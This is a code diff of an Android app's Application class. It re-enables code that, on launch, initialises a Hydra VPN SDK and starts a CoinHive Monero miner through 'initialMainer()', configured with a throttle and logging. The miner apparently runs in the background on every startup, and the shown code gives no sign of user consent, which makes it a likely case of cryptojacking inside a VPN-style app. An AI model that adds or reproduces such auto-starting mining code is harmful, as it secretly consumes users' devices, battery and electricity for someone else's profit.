@@ -1,22 +1,23 @@
 package com.example.pavel.monero;
 
 import android.app.Application;
-/*import com.anchorfree.hydrasdk.HydraSDKConfig;
+import com.anchorfree.hydrasdk.HydraSDKConfig;
 import com.anchorfree.hydrasdk.HydraSdk;
 import com.anchorfree.hydrasdk.api.ClientInfo;
 import com.anchorfree.hydrasdk.vpnservice.connectivity.NotificationConfig;
-import com.example.pavel.monero.serves.CoinHive;*/
+import com.example.pavel.monero.serves.CoinHive;
+
 
 public class App extends Application {
 
     @Override
     public void onCreate() {
         super.onCreate();
-        //initHydraSDK();
-        //initialMainer();
+        initHydraSDK();
+        initialMainer();
     }
 
-  /*  private void initHydraSDK(){
+    private void initHydraSDK(){
         HydraSdk.init(this, ClientInfo.newBuilder()
                         .baseUrl("https://backend.northghost.com/") // set base url for api calls
                         .carrierId("31415_31415") // set your carrier id
@@ -40,5 +41,5 @@ public class App extends Application {
                 .setThrottle(0.2) // optional
                 .setLoggingEnabled(true) // To logcat mining status, false by default.
                 .setForceASMJS(false); // optional;
-    }*/
+    }
 }
